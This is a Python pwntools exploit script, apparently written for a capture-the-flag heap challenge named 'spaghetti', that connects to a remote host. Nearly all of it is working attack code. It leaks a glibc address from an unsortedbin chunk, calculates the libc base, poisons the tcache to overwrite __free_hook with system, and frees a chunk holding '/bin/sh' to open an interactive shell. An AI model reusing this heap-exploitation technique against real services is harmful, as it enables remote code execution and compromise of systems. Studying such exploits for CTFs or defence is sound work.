from pwn import *
import re

gs = '''
set breakpoint pending on
break _IO_flush_all_lockp
enable breakpoints once 1
continue
'''

#context.terminal = ['tmux', 'splitw', '-h']
#p=process("./spaghetti")
p = remote("207.154.239.148", 1369)
#p=gdb.debug("./spaghetti", gdbscript=gs)
#gdb.attach(p)

def malloc(ind, size):
    global p
    r1 = p.sendlineafter(b">", b"1")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">", str(size).encode())
    #r4 = p.sendlineafter(b">",payload)
    return r1+r2+r3

def free(ind):
    global p
    r1 = p.sendlineafter(b">", b"2")
    r2 = p.sendlineafter(b">", str(ind).encode())
    return r1+r2

def edit(ind, payload):
    global p
    r1 = p.sendlineafter(b">", b"3")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">",payload)
    return r1+r2+r3

def view(ind):
    global p
    r1 = p.sendlineafter(b">", b"4")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.recvuntil(b"You are using")
    return r1+r2+r3


# Now our actual Exploit Script:
malloc(0, 24)    # Will be lost when we cut the worm / tcachebin (needed to keep tcache count accurate)
malloc(1, 24)    # Will be put into tcache also and its next value will be changed to freehook
malloc(2, 0x421)    # Big boi (to put into unsortedbin)
malloc(3, 24)    # 2 purposes: as Jon Snow / wall + will hold arg that we will call freehook with
edit(3, b"/bin/sh")

free(2)    # Put chunk 2 in unsortedbin so it points to a glibc addr

resp = view(2)    # View the glibc addr leak
leak = resp.split(b"index?\n> ")[1].split(b"\nYou ")[0]
leak = u64(leak.ljust(8, b"\x00"))    # Formatted leak
base = leak - 2018272       # Calculate glibc base w/ offset

elf = ELF("./libc.so.6")
freehookOffset = elf.sym["__free_hook"]
systemOffset = elf.sym["system"]
freehook = base + freehookOffset   # Actual freehook addr in glibc for current run
system = base + systemOffset    # Actual system addr in glibc for current run

free(0)     # Push chunk 0 into tcachebins
free(1)     # Push chunk 1 into tcachebins
edit(1, p64(freehook))  # Change next value of chunk 1 to freehook addr
malloc(4, 24)   # Pop chunk 1 addr from tcachebins = chunk 4
malloc(5, 24)   # Pop freehook addr from tcachebins = chunk 5
edit(5, p64(system))    # Put system addr in chunk 5, so in freehook
free(3)     # Call freehook("/bin/sh") which is --> system("/bin/sh")
p.interactive()
